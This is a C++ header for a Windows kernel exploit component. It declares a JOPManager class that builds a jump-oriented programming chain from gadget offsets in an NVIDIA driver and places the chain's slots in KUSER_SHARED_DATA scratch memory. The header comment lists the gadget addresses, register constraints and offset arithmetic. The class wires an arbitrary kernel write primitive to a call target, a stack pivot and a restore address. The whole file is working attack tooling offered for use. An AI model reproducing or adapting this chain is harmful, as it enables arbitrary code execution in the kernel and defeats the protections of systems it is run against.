#pragma once
#include "general.h"
#include "offsets.h"
#include <vector>
#include <functional>

/*
Gadget chain (nvidia offsets):
  +0x0078CB9E: call [rax-0x35C17]     ; jmp [rsi+0x66]
  +0x006d066a: pop rdx ; wait         ; jmp qword [rsi-0x39]
  +0x00671319: mov qword [rdx+0x3E0], rax
               mov [rdx+0x3E8], eax
               mov rax, qword [rdx+0x1B0]
               mov rdx, rax
               jmp qword [rax+0x1C0]
  +0x0061cbb5: pop rsp                ; jmp qword [rax+0x28]

Scratch starts at KUSD_BASE + KUSERSHAREDDATA_SIZE (past the live struct,
still within the same mapped page).

rsi constraints — both slots must be in scratch:
  [rsi+0x66] = scratch + RSI_FWD_OFF  -> holds g3
  [rsi-0x39] = scratch + RSI_BCK_OFF  -> holds g4
  RSI_FWD_OFF - RSI_BCK_OFF = 0x66 + 0x39 = 0xA5

  RSI_BCK_OFF = 0x00  (first slot in scratch)
  RSI_FWD_OFF = 0xA5
  rsi = scratch + 0xA5 - 0x66 = scratch + 0x3F

rdx anchor — gadget3 reads new_rax from [rdx+0x1B0]:
  rdx = scratch_base - 0x1B0    <- points 0x1B0 before scratch
  [rdx+0x1B0] = scratch + 0x00  (same as RSI_BCK slot, reused — or use +0xB0)
  Actually use a dedicated slot: RDX_1B0_OFF = 0xB0
  rdx = scratch_base + 0xB0 - 0x1B0 = scratch_base - 0x100
        = KUSD_BASE + KUSERSHAREDDATA_SIZE - 0x100
        = KUSD_BASE + 0x980  (still inside KUSD struct — unavoidable given the 0x1B0 gap)

  Writes from gadget3: [rdx+0x3E0] and [rdx+0x3E8] land at
        scratch_base + 0x2E0 and +0x2E8  (both within the 4KB page)

  new_rax = scratch_base + 0xC0     (slot at scratch+0xC0)
  [new_rax+0x1C0] = scratch+0x280   -> g4
  [new_rax+0x28]  = scratch+0xE8    -> rop pivot target
*/

#define KUSD_BASE               0xFFFFF78000000000ULL
#define KUSD_SCRATCH_OFF        KUSERSHAREDDATA_SIZE        // 0xa80

// All offsets below are relative to KUSD_BASE + KUSD_SCRATCH_OFF
#define SCRATCH_RSI_BCK         0x00    // [rsi-0x39] -> g4
#define SCRATCH_RSI_FWD         0xA5    // [rsi+0x66] -> g3   (BCK + 0xA5)
#define SCRATCH_RAX             0xB0    // [rax-0x35C17] -> g2  (also used as [rdx+0x1B0] base)
#define SCRATCH_NEW_RAX         0xC0    // new_rax value; gadget3 loads rax from [rdx+0x1B0]
#define SCRATCH_G3_CONT         0x280   // [new_rax+0x1C0] -> g4  (0xC0 + 0x1C0 = 0x280)
#define SCRATCH_G4_CONT         0xE8    // [new_rax+0x28]  -> pivot  (0xC0 + 0x28 = 0xE8)
#define SCRATCH_ALLOC_START     0xF0    // general scratch grows from here
#define SCRATCH_MAX             (0x1000 - KUSD_SCRATCH_OFF)   // remaining bytes in page

struct JopSlot {
    const char* name;
    UINT64      addr;
    UINT64      value;
};

class JOPManager {
private:
    std::function<void(UINT64, UINT64)> writeFn;
    std::vector<JopSlot> slots;
    UINT64 allocPtr;    // offset from scratch base, grows up

    UINT64 nvidiaBase;
    UINT64 scratchBase; // = KUSD_BASE + KUSD_SCRATCH_OFF

    UINT64 rax, rsi, rdx;

    void AddSlot(const char* name, UINT64 scratchOff, UINT64 value);
    UINT64 Alloc(const char* name, UINT64 value);

public:
    JOPManager();
    ~JOPManager() = default;

    void SetWritePrimitive(std::function<void(UINT64, UINT64)> fn);
    void SetNvidiaBase(UINT64 base);
    void SetScratchBase(UINT64 base); // override default KUSD+0xa80 with writable KUSD from MmWriteableSharedUserData

    void Build(UINT64 g1Off, UINT64 g2Off, UINT64 g3Off, UINT64 g4Off);
    void Commit();
    void SetRestoreRip(UINT64 addr); // sets [newRax+0x28]   — last jump in chain
    void SetCallTarget(UINT64 addr); // sets [rax-0x35C17]   — address called by gadget1

    UINT64 GetRax() const { return rax; }
    UINT64 GetRsi() const { return rsi; }
    UINT64 GetRdx() const { return rdx; }
    UINT64 GetPopRdxValue() const { return rdx; } // push this before firing chain: gadget2 pops it into rdx

    void PrintLayout() const;
};
